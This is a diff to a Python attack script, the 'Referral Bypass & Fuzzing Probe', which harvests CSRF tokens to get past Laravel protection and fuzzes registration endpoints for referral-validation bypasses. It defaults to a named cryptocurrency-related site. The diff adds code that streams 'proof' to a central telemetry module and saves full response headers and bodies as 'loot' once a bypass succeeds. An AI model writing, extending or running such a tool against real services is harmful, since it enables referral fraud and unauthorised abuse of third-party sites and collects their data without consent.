@@ -1,16 +1,18 @@
 #!/usr/bin/env python3
 """
-REFERRAL BYPASS & FUZZING PROBE v7.4
+REFERRAL BYPASS & FUZZING PROBE v7.5
 Evaluates multi-target registration endpoints for referral validation bypasses.
 Features:
 - Dynamic target ingestion (No hardcoded domains)
 - Automated pre-flight CSRF token harvesting (Bypasses Laravel 419 Page Expired checks)
-- Robust terminal color output mapping
+- Centralized framework telemetry streaming and immutable loot exfiltration (loot_output/)
 """
 import sys
 import re
 import json
 from modules.transport import SecureTransport
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 COLORS = {
     "RED": "\033[91m",
@@ -91,7 +93,26 @@ def audit_referral_logic(target_host=None):
 
         if status in [200, 201, 302] and "error" not in body.lower() and "419" not in str(status):
             log(f"[!] SUCCESS! Referral validation bypassed on {target_url} using: {test['name']}", "RED")
-            break
+            
+            # STREAM TELEMETRY & PERSIST REFERRAL BYPASS LOOT TO DISK
+            bypass_evidence = {
+                "vector": test["name"],
+                "payload_value": str(test["ref"]),
+                "registration_endpoint": registration_endpoint
+            }
+            stream_proof("REFERRAL_BYPASS_SUCCESS", registration_endpoint, payload, body[:300], bypass_evidence)
+            save_session_loot(
+                target=target_url,
+                endpoint=registration_endpoint,
+                finding_type=f"REFERRAL_BYPASS_{test['name'].replace(' ', '_').upper()}",
+                status=status,
+                headers=dict(headers),
+                body=body,
+                extra_loot=bypass_evidence
+            )
+            return True
+
+    return False
 
 if __name__ == "__main__":
     target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
